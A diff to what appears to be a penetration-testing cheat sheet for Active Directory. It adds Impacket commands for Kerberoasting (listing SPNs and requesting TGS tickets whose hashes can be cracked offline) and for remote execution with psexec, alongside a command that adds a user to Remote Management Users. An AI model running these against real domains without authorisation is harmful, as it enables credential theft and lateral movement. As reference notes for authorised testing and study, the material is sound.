@@ -20,6 +20,17 @@ Remote Management Users group is to allow users to remotely manage computers wit
 net localgroup "Remote Management Users" <username> /add
 ````
 ## GetUserSPNs
+Impacket’s GetUserSPNs.py again simplifies the process to find SPNs, and is also able to request the TGS and
+extract the hash for offline cracking.
 ````bash
 impacket-GetUserSPNs <domain>/<username> -dc-ip <DC-IP>
+````
+### Requesting TGS ticket
+Requesting a Ticket Granting Service ticket, which is can be cracked offline because the TGS_REP is encrypted using NTLM password hash of the account in whose context the service instance is running.
+````bash
+impacket-GetUserSPNs <domain>/<username> -dc-ip <DC-IP> -request
+````
+## PSexec
+````bash
+impacket-psexec <domain>/<username>:<password>@<IP-ADDRESS>
 ````
